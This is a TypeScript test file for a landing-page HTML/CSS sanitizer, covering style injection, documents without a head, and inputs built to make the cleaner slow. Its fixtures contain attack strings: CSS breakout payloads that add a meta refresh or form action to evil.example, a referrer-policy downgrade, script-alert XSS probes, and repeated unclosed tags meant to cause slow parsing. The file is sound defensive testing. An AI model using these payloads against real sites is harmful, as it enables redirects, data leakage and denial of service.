import { describe, expect, it } from 'vitest';
import {
  injectPageStyles,
  maskInert,
  sanitizeLandingCss,
  sanitizeLandingHtml,
  sanitizeLandingHtmlStrict,
} from './landing-html-sanitize';

/**
 * THE THIRD ROUND: A SCANNER THAT DISAGREES WITH THE BROWSER, A DOCUMENT
 * WITH NO HEAD, AND INPUT BUILT TO MAKE THE CLEANER CRAWL.
 */

const style = (css: string) => `<style id="zaki-custom-style">${css}</style>`;
const attributeNames = (html: string) => maskInert(html);

describe('a quote the browser does not count', () => {
  // The payload is the CSS: it tries to end whatever it landed in and add a
  // meta refresh. What is asserted is what a browser would see as MARKUP —
  // the mask blanks comments, attribute values and the text of style, title
  // and textarea — so an attribute NAME showing up there is a live attribute.
  const cases: Record<string, { html: string; css: string }> = {
    'unquoted value holding an apostrophe, then a single-quoted </head>': {
      html: "<p x=a'><meta name=x data='</head>'>",
      css: "' http-equiv=refresh content=0;url=https://evil.example x='",
    },
    'the same, double quotes': {
      html: '<p x=a"><meta name=x data="</head>">',
      css: '" http-equiv=refresh content=0;url=https://evil.example x="',
    },
    'the same, inside a whole document': {
      html: "<!doctype html><html><head><title>t</title></head><body><p x=a'><meta name=x data='</head>'></body></html>",
      css: "' http-equiv=refresh content=0;url=https://evil.example x='",
    },
    'an unquoted value that ends at the tag': {
      html: '<p x=a><meta data=</head>>',
      css: '> <meta http-equiv=refresh content=0;url=https://evil.example>',
    },
    'a form action': {
      html: "<p x=a'><form data='</head>'>",
      css: "' action=https://evil.example x='",
    },
    'a referrer policy': {
      html: "<p x=a'><meta data='</head>'>",
      css: "' name=referrer content=unsafe-url x='",
    },
  };

  for (const [name, { html, css }] of Object.entries(cases)) {
    it(`${name}: nothing it adds is live`, () => {
      const out = injectPageStyles(html, '', style(css));
      const live = attributeNames(out);
      expect(live).not.toMatch(/http-equiv|referrer|refresh|\baction\b/i);
      // and it did not vanish: the stylesheet is in, as markup
      expect(live).toMatch(/<style id="_+">/);
      // and the document it was put into is still all there
      expect(out.replace(/<style id="zaki-custom-style">[\s\S]*?<\/style>/, '')).toBe(html);
    });
  }

  // negative: an ordinary document gets its styles before the real </head>
  it('a sound document takes them just before its </head>, and reads the same afterwards', () => {
    const html = '<!doctype html><html><head><title>t</title><meta charset="utf-8"></head><body>B</body></html>';
    const out = injectPageStyles(html, '', style('a{color:red}'));
    expect(out).toBe(html.replace('</head>', style('a{color:red}') + '</head>'));
  });

  it('the scanner counts a quote only after an =', () => {
    expect(maskInert("<p x=a'><b>")).toBe("<p x=__><b>");
    expect(maskInert('<p x="a>b"><b>')).toBe('<p x="___"><b>');
    expect(maskInert("<p x = 'a b' y=z>")).toBe("<p x = '___' y=_>");
  });
});

describe('a document with no </head>', () => {
  const css = style('a{color:red}');

  it('takes the styles AFTER the doctype, never before it (quirks mode)', () => {
    const html = '<!doctype html><html><body>BODY</body></html>';
    const out = injectPageStyles(html, '', css);
    expect(out.startsWith('<!doctype html>')).toBe(true);
    expect(out).toBe('<!doctype html>' + css + '<html><body>BODY</body></html>');
  });

  it('after a comment and the doctype, and past a byte-order mark', () => {
    const html = '﻿<!-- made by hand -->\n<!DOCTYPE html>\n<html><body>x</body></html>';
    const out = injectPageStyles(html, '', css);
    expect(out.indexOf('<style')).toBeGreaterThan(out.indexOf('<!DOCTYPE html>'));
    expect(out.indexOf('<style')).toBeLessThan(out.indexOf('<html>'));
  });

  // negative: no doctype at all is no worse than it was
  it('with no doctype the styles are first, as before', () => {
    expect(injectPageStyles('<p>x</p>', '', css)).toBe(css + '<p>x</p>');
  });

  it('a payload that makes the head unfindable falls back to the front and stays inert', () => {
    const html = "<!doctype html><p x=a'><meta data='</head>'>";
    const out = injectPageStyles(html, '', style("' http-equiv=refresh x='"));
    expect(out.startsWith('<!doctype html><style')).toBe(true);
    expect(maskInert(out)).not.toMatch(/http-equiv/i);
  });
});

/**
 * INPUT BUILT TO MAKE THE CLEANER CRAWL.
 *
 * Measured before the fix, on 256 KB: `<meta ` 8.9 s, `<script ` 5.2 s, a run
 * of letters 28 s. None of them is a page; every one is refused or cleaned in
 * a few milliseconds now. The budget the review set is 100 ms.
 */
describe('hostile input is cheap', () => {
  const N = 256 * 1024;
  const rep = (s: string) => s.repeat(Math.floor(N / s.length));
  const timed = <T>(fn: () => T): { ms: number; value: T } => {
    const t = performance.now();
    const value = fn();
    return { ms: performance.now() - t, value };
  };

  const hostile: Record<string, string> = {
    '<script> repeated, never closed': rep('<script>'),
    '<script  with no end': rep('<script '),
    '<iframe  with no end': rep('<iframe '),
    '<iframe> repeated, never closed': rep('<iframe>'),
    '<object  with no end': rep('<object '),
    '<applet> repeated': rep('<applet>'),
    '<meta  with no end': rep('<meta '),
    '<form  with no end': rep('<form '),
    '<style  with no end': rep('<style '),
    '<link  with no end': rep('<link '),
    '<base  with no end': rep('<base '),
    'end tags with no end': rep('</script '),
    'one long word': 'a'.repeat(N),
    'one long j': 'j'.repeat(N),
    'a= repeated': rep('a='),
    'comment openers': rep('<!--'),
    'svg styles': rep('<svg><style>'),
  };

  for (const [name, html] of Object.entries(hostile)) {
    it(`${name}: under 100 ms`, () => {
      const { ms } = timed(() => sanitizeLandingHtml(html));
      expect(ms).toBeLessThan(100);
    });
  }

  it('and what it cannot clean in that time it refuses, rather than saying it is clean', () => {
    expect(sanitizeLandingHtmlStrict(rep('<meta '))).toBeNull();
    expect(sanitizeLandingHtmlStrict(rep('<script '))).toBeNull();
    // refused is NOT the same answer as «nothing was left»
    expect(sanitizeLandingHtmlStrict('<script>alert(1)</script>')).toBe('');
    expect(sanitizeLandingHtml(rep('<meta '))).toBe('');
  });

  it('a start tag with no end tag still goes (it is not left for the browser to close)', () => {
    const out = sanitizeLandingHtml('<p>a</p><script>alert(1)<p>b</p><script>alert(2)');
    expect(out).not.toMatch(/<script/i);
    expect(out).toContain('<p>a</p>');
  });

  it('and several complete pairs with text between them lose only the pairs', () => {
    const out = sanitizeLandingHtml('A<script>1</script>B<iframe src=x></iframe>C<object data=y></object>D<applet></applet>E');
    expect(out).toBe('ABCDE');
  });

  // negative: a big sound page is neither refused nor slow nor changed
  it('a 200 KB page of ordinary tags passes unchanged, quickly', () => {
    const page = '<!doctype html><html><head><title>t</title></head><body>' + '<div class="a"><p>نص <b>عرض</b></p><img src="https://cdn.example/x.jpg" alt="x"></div>\n'.repeat(2500) + '</body></html>';
    const { ms, value } = timed(() => sanitizeLandingHtmlStrict(page));
    expect(value).toBe(page);
    expect(ms).toBeLessThan(500);
  });

  it('a script full of comparisons next to arrows is still not mistaken for an attack', () => {
    const page = '<html><body><p>x</p><script>' + 'for (let i = 0; i < n; i++) { if (a < b) go(x => x); }\n'.repeat(400) + '</script></body></html>';
    expect(sanitizeLandingHtmlStrict(page)).not.toBeNull();
  });
});
